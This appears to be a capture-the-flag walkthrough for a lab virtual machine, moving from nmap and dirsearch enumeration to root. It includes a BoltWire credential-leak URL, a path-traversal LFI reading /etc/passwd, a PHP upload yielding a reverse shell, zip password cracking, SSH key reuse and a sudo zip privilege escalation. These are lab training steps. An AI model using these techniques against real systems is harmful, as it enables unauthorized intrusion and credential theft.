# Machine Info

IP: 192.168.56.105

# Enumeration

## Nmap

```
$ nmap -A -T4 192.168.56.105
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-22 18:21 EDT
Nmap scan report for 192.168.56.105
Host is up (0.00058s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 bd:96:ec:08:2f:b1:ea:06:ca:fc:46:8a:7e:8a:e3:55 (RSA)
|   256 56:32:3b:9f:48:2d:e0:7e:1b:df:20:f8:03:60:56:5e (ECDSA)
|_  256 95:dd:20:ee:6f:01:b6:e1:43:2e:3c:f4:38:03:5b:36 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Bolt - Installation error
|_http-server-header: Apache/2.4.38 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      41627/tcp6  mountd
|   100005  1,2,3      54911/tcp   mountd
|   100005  1,2,3      58841/udp6  mountd
|   100005  1,2,3      59985/udp   mountd
|   100021  1,3,4      36863/tcp   nlockmgr
|   100021  1,3,4      41141/tcp6  nlockmgr
|   100021  1,3,4      45115/udp6  nlockmgr
|   100021  1,3,4      48963/udp   nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs     3-4 (RPC #100003)
8080/tcp  open  http    Apache httpd 2.4.38 ((Debian))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: PHP 7.3.27-1~deb10u1 - phpinfo()
|_http-server-header: Apache/2.4.38 (Debian)
50389/tcp open  mountd  1-3 (RPC #100005)
MAC Address: 08:00:27:A7:40:EC (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.56.105

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.61 seconds

```

## HTTP

Port 80:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/db483102-6659-411a-bc36-1caee5237312/image.png)

Dirsearch on port 80:

```
$ dirsearch -u http://192.168.56.105
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                             
                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/TCM/Dev/reports/http_192.168.56.105/_24-10-22_18-31-22.txt

Target: http://192.168.56.105/

[18:31:22] Starting:                                                                                                                                
[18:31:23] 200 -  931B  - /.gitignore                                       
[18:31:24] 403 -  279B  - /.ht_wsr.txt                                      
[18:31:24] 403 -  279B  - /.htaccess.bak1                                   
[18:31:24] 403 -  279B  - /.htaccess.sample
[18:31:24] 403 -  279B  - /.htaccess.orig                                   
[18:31:24] 403 -  279B  - /.htaccess_sc                                     
[18:31:24] 403 -  279B  - /.htaccess_orig
[18:31:24] 403 -  279B  - /.htaccess_extra
[18:31:24] 403 -  279B  - /.htaccessBAK
[18:31:24] 403 -  279B  - /.htaccessOLD2
[18:31:24] 403 -  279B  - /.htaccess.save                                   
[18:31:24] 403 -  279B  - /.htm                                             
[18:31:24] 403 -  279B  - /.htaccessOLD
[18:31:24] 403 -  279B  - /.html                                            
[18:31:24] 403 -  279B  - /.htpasswd_test
[18:31:24] 403 -  279B  - /.httr-oauth
[18:31:24] 403 -  279B  - /.htpasswds                                       
[18:31:24] 403 -  279B  - /.php                                             
[18:31:32] 301 -  314B  - /app  ->  http://192.168.56.105/app/              
[18:31:32] 200 -  487B  - /app/cache/                                       
[18:31:32] 200 -  518B  - /app/                                             
[18:31:35] 200 -  971B  - /composer.json                                    
[18:31:35] 200 -  206KB - /composer.lock                                    
[18:31:49] 301 -  317B  - /public  ->  http://192.168.56.105/public/        
[18:31:49] 302 -  332B  - /public/  ->  /public/bolt/userfirst              
[18:31:49] 200 -  345B  - /README.md
[18:31:50] 403 -  279B  - /server-status                                    
[18:31:50] 403 -  279B  - /server-status/
[18:31:52] 301 -  314B  - /src  ->  http://192.168.56.105/src/              
[18:31:52] 200 -  445B  - /src/                                             
[18:31:55] 200 -    0B  - /vendor/composer/autoload_classmap.php            
[18:31:55] 200 -    0B  - /vendor/composer/autoload_psr4.php                
[18:31:55] 200 -    0B  - /vendor/autoload.php                              
[18:31:55] 200 -    0B  - /vendor/composer/autoload_files.php               
[18:31:55] 200 -    0B  - /vendor/composer/autoload_namespaces.php          
[18:31:55] 200 -    0B  - /vendor/composer/autoload_real.php
[18:31:55] 200 -    0B  - /vendor/composer/autoload_static.php
[18:31:55] 200 -    0B  - /vendor/composer/ClassLoader.php
[18:31:55] 200 -  832B  - /vendor/
[18:31:55] 200 -  191KB - /vendor/composer/installed.json
[18:31:55] 200 -    1KB - /vendor/composer/LICENSE                          
                                                                             
Task Completed                                 
```

None of the above findings are especially interesting. They just list some of the website files.

Port 8080:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/b66e7a84-998a-40db-849b-59e9de65ad57/image.png)

Dirsearch on port 8080:

```
$ dirsearch -u http://192.168.56.105:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                    
 (_||| _) (/_(_|| (_| )                                                                                                                             
                                                                                                                                                    
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/TCM/Dev/reports/http_192.168.56.105_8080/_24-10-22_18-38-36.txt

Target: http://192.168.56.105:8080/

[18:38:36] Starting:                                                                                                                                
[18:38:37] 403 -  281B  - /.ht_wsr.txt                                      
[18:38:37] 403 -  281B  - /.htaccess.bak1
[18:38:37] 403 -  281B  - /.htaccess.orig                                   
[18:38:37] 403 -  281B  - /.htaccess.save
[18:38:37] 403 -  281B  - /.htaccess_extra                                  
[18:38:37] 403 -  281B  - /.htaccess_orig
[18:38:37] 403 -  281B  - /.htaccessOLD
[18:38:37] 403 -  281B  - /.htaccessBAK
[18:38:37] 403 -  281B  - /.htaccess.sample                                 
[18:38:37] 403 -  281B  - /.htm                                             
[18:38:37] 403 -  281B  - /.htaccess_sc                                     
[18:38:37] 403 -  281B  - /.htaccessOLD2
[18:38:37] 403 -  281B  - /.html                                            
[18:38:37] 403 -  281B  - /.htpasswds                                       
[18:38:37] 403 -  281B  - /.httr-oauth
[18:38:37] 403 -  281B  - /.htpasswd_test                                   
[18:38:38] 403 -  281B  - /.php                                             
[18:38:52] 301 -  321B  - /dev  ->  http://192.168.56.105:8080/dev/         
[18:38:52] 200 -    2KB - /dev/                                             
[18:39:13] 403 -  281B  - /server-status/                                   
[18:39:13] 403 -  281B  - /server-status                                    
                                                                             
Task Completed                               
```

Found the bolt login page at http://192.168.56.105:8080/dev/

I created an account with the name ‘t’.

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/8b5b564c-88cf-4836-b2fd-59db9607589f/image.png)

In the URL, I noticed ‘id=t’ and changed it to ‘id=admin’ then got this message:

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/4932cfcb-08ca-40a0-ae89-219b81b741da/image.png)

I tried some actions but kept getting denied admin access even after that message. I googled BoltWire exploit and found this github page: https://github.com/Cyber-Wo0dy/CVE-2023-46501

I followed the steps listed there and went to http://192.168.56.105:8080/dev/index.php?p=member.admin&action=data

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/34ee5b3a-06c9-47fd-846b-f2f880632173/image.png)

Seems like the member.admin user has the password ‘I_love_java”

I was able to log out of my ‘t’ account and log in as admin with that password!

The version of BoltWire is 6.03

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/6b4fa48d-a6af-4adf-b53e-8e126ea9e5eb/image.png)

Google shows me there is a local file inclusion exploit for this version of BoltWire: https://www.exploit-db.com/exploits/48411

And it worked when I browsed to

```
http://192.168.56.105:8080/dev/index.php?p=action.search&action=../../../../../../../etc/passwd
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/dc85f808-f090-4e4d-87e1-d95e04cc16f0/image.png)


So we have a user on the server named jeanpaul. I tried checking for a similar user in BoltWire but it didn’t exist.

I found a page that allows me to upload a file

```
http://192.168.56.105:8080/dev/index.php?p=action.upload&action=view
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/e0f8c88d-1c2f-4d71-bc72-1e72fdc8f6b8/image.png)

Php files are not allowed currently. However, I found the config page and changed that.

```
http://192.168.56.105:8080/dev/index.php?p=site.config&action=edit
```

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/9dbd598d-7e94-428f-b960-b32eeb89a882/1654a8c1-45d3-4e20-bd0a-ee5cb915368a/image.png)

By uploading payload.php then browsing to http://192.168.56.105:8080/dev/files/payload.php, I was able to get a reverse shell.

```
└─$ nc -lvp 6000 
listening on [any] 6000 ...
192.168.56.105: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.105] 41012
whoami
www-data
hostname
dev
```

I ran linpeas on the server but didn’t find anything of interest.

I decided to check out port 2049. I mounted the drive and found save.zip. The zip file has a password on it so I decided to try to crack it with fcrackzip:

```
└─$ fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
found file 'id_rsa', (size cp/uc   1435/  1876, flags 9, chk 2a0d)
found file 'todo.txt', (size cp/uc    138/   164, flags 9, chk 2aa1)

PASSWORD FOUND!!!!: pw == java101

```

Todo.txt:

```
$ cat todo.txt              
- Figure out how to install the main website properly, the config file seems correct...
- Update development website
- Keep coding in Java because it's awesome

jp

```

This looks like a note from jp which is probably the user jeanpaul. We can try to ssh in as him with the ssh key that was included in the zip file.

```
$ ssh -i id_rsa jeanpaul@192.168.56.105
Enter passphrase for key 'id_rsa': 
```

The ssh key has a passphrase on it. I tried the password I found earlier for the admin of BoltWire (I_love_java) and it worked!

```
Linux dev 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  2 05:25:21 2021 from 192.168.10.31
jeanpaul@dev:~$ ls
jeanpaul@dev:~$ pwd
/home/jeanpaul
```

Check what we can run as sudo:

```
jeanpaul@dev:~$ sudo -l
Matching Defaults entries for jeanpaul on dev:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jeanpaul may run the following commands on dev:
    (root) NOPASSWD: /usr/bin/zip
```

That looks promising! GTFOBins has an exploit for the zip binary

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

I ran those commands and boom!

```
jeanpaul@dev:~$ TF=$(mktemp -u)
jeanpaul@dev:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt
# cat flag.txt
Congratz on rooting this box !
# 

```
